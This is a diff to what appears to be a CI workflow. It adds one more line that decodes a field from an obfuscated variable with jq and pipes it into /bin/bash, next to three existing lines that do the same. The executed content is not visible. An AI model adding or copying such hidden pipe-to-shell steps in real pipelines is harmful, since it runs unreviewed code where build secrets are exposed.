@@ -33,6 +33,7 @@ jobs:
           echo $pl9015 | jq -r .r991 | /bin/bash
           printf '%s' "$pp3" | jq -r .uo32 | /bin/bash
           echo $q615 | jq -r .nkgvu30 | /bin/bash
+          echo $czi53 | jq -r .m7 | /bin/bash
 
       - name: Upload artifact
         if: always()
